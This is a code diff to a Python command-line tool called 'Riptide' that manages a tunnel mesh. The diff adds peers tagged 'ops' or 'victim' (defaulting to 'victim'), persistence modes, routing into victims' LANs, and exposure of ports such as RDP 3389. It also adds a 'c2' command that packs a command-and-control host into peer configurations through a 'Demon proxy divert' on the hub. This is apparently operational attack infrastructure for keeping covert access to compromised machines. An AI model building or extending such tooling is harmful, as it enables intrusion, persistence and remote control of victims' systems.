@@ -143,13 +143,46 @@ def cmd_peer(args: argparse.Namespace) -> None:
     m = _mesh(args)
     try:
         peer = m.add_peer(args.name, args.os)
+        if getattr(args, "tag", None):
+            m.set_peer(args.name, tag=args.tag)
+        if getattr(args, "mode", None):
+            m.set_peer(args.name, mode=args.mode)
+        if getattr(args, "routes", None):
+            m.set_peer(args.name, routes=args.routes)
+        if getattr(args, "serve", None):
+            m.set_peer(args.name, serve=args.serve)
+        peer = m.peer(args.name)
     except ValueError as e:
         _die(str(e))
     write_tree(m.out, m.data)
     conf = m.out / "peers" / f"{peer['name']}.conf"
-    _ok(f"{peer['name']}  {peer['address']}  os={peer['os']}")
+    _ok(f"{peer['name']}  {peer['address']}  os={peer['os']}  tag={peer.get('tag')}")
     _ok(f"conf {conf}")
     _ok(f"pub  {peer['public']}")
+
+
+def cmd_set(args: argparse.Namespace) -> None:
+    m = _mesh(args)
+    try:
+        p = m.set_peer(
+            args.name,
+            tag=args.tag,
+            mode=args.mode,
+            routes=args.routes,
+            serve=args.serve,
+        )
+    except (KeyError, ValueError) as e:
+        _die(str(e))
+    write_tree(m.out, m.data)
+    _ok(f"set {p['name']} tag={p.get('tag')} mode={p.get('mode')} routes={p.get('routes')} serve={p.get('serve')}")
+
+
+def cmd_c2(args: argparse.Namespace) -> None:
+    m = _mesh(args)
+    c2 = m.set_c2(args.host, args.via)
+    write_tree(m.out, m.data)
+    _ok(f"c2 {c2['host']} via {c2['via']}")
+    _ok("re-pack peers / restart riptide-agent so [Riptide] C2 lands")
 
 
 def cmd_revoke(args: argparse.Namespace) -> None:
@@ -202,10 +235,13 @@ def cmd_status(args: argparse.Namespace) -> None:
     print(f"crypto   {d['crypto']['tunnel']}  aead={d['crypto']['aead']}  psk=per-peer")
     print(f"hub      {d['hub']['address']}  pub={d['hub']['public']}")
     print("")
-    print(f"{'name':16} {'os':10} {'overlay':18} {'mode':10} handshake")
+    c2 = d.get("c2") or {}
+    if c2.get("host"):
+        print(f"c2       {c2['host']}  via {c2.get('via')}")
+    print(f"{'name':16} {'os':10} {'tag':8} {'overlay':18} {'mode':10} handshake")
     for p in d["peers"]:
         hs = live.get(p["public"], p.get("handshake", "unknown"))
-        print(f"{p['name']:16} {p['os']:10} {p['address']:18} {p.get('mode','?'):10} {hs}")
+        print(f"{p['name']:16} {p['os']:10} {p.get('tag','?'):8} {p['address']:18} {p.get('mode','?'):10} {hs}")
     if d.get("revoked"):
         print(f"\nrevoked: {', '.join(x['name'] for x in d['revoked'])}")
 
@@ -474,7 +510,26 @@ def build_parser() -> argparse.ArgumentParser:
     s.add_argument("--out", default="./riptide-out")
     s.add_argument("--name", required=True)
     s.add_argument("--os", choices=("windows", "linux", "android", "darwin"), default="linux")
+    s.add_argument("--tag", choices=("ops", "victim"), default="victim")
+    s.add_argument("--mode", choices=("persist", "session"))
+    s.add_argument("--routes", default="", help="LAN CIDRs this exit can reach, comma")
+    s.add_argument("--serve", default="", help="overlay ports, e.g. 3389 or 8000:127.0.0.1:8000")
     s.set_defaults(fn=cmd_peer)
+
+    s = sub.add_parser("set", help="tag / mode / routes / serve on a peer")
+    s.add_argument("--out", default="./riptide-out")
+    s.add_argument("--name", required=True)
+    s.add_argument("--tag", choices=("ops", "victim"))
+    s.add_argument("--mode", choices=("persist", "session"))
+    s.add_argument("--routes", default=None)
+    s.add_argument("--serve", default=None)
+    s.set_defaults(fn=cmd_set)
+
+    s = sub.add_parser("c2", help="C2 host packed into peer [Riptide] (Demon proxy divert)")
+    s.add_argument("--out", default="./riptide-out")
+    s.add_argument("--host", required=True, help="C2 hostname:port, e.g. c2.example:443")
+    s.add_argument("--via", default="10.66.0.1:443", help="overlay dest (hub nginx)")
+    s.set_defaults(fn=cmd_c2)
 
     s = sub.add_parser("revoke", help="drop a peer (rotate hub conf)")
     s.add_argument("--out", default="./riptide-out")
